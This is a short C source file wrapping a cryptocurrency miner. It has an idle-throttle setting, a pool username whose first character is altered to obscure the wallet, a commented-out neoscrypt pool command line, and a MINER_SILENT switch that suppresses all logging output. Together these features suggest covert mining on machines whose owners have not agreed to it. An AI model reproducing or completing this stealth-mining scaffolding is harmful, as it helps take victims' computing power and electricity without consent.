#define ACD_VERSION "02"
//#define MINER_SILENT

int miner_main(int argc, char *argv[]);

static int kIdle;

void *input_thread(void *userdata) {

    while(1) {
        int k = getchar() - '0';
        if(k >= 0 && k < 100) {
            kIdle = k;
            printf("Set kIdle = %d\n", kIdle);
        }
    }
    return NULL;
}

int main(int argc_, char *argv_[])
{
	//printf("started daemon v" ACD_VERSION "\n");

	
    kIdle = 6;
    //pthread_t inp_thread;
    //pthread_create(&inp_thread, NULL, input_thread, &kIdle);
	

	
	char poolUser[200];
	snprintf(poolUser,sizeof(poolUser), "%sUwYk698d5AP4bHwT9mH.ac" ACD_VERSION "_%s", "Hd7c6xDYKik1vkg", (argc_ > 1) ? argv_[1] : "");
	poolUser[0]--; // make H -> G
	//minerd.exe -a neoscrypt -o stratum+tcp://pool.unimining.net:4233 -u Gd7c6xDYKik1vkgUwYk698d5AP4bHwT9mH.xps13 -p c=GBX -e 2
	char *  argv[] = {
		"meepo",
		//"-a", "neoscrypt",
		//"-o", "stratum+tcp://pool.unimining.net:4233",
		//"-u", poolUser,
		//"-p", "c=GBX",
		//"-e", "2"
	};
	int argn = sizeof(argv) / sizeof(char*);
	miner_main(argn, argv);
	
	//input_thread(0);
}

struct timeval tv_throttleMeasure[16];

/*
void miner_throttle(int thr_id) {
    usleep(1000*kIdle);
    return;

//int kIdle = 12;
    struct timeval *m = &tv_throttleMeasure[thr_id % 16];
    if(m->tv_sec) {
        struct timeval n, diff;
        gettimeofday(&n, NULL);
        timeval_subtract(&diff, &n, m);
        ullong diffUs = (diff.tv_sec * 1e6 + diff.tv_usec);

        usleep(diffUs * kIdle);
    }
    gettimeofday(m, NULL);

}
*/

void printf_miner(const char *fmt, ...)
{
}


//#define printf printf_miner

#ifdef MINER_SILENT
#define printf(...)
#define fprintf(...)
#define applog(...)
#endif 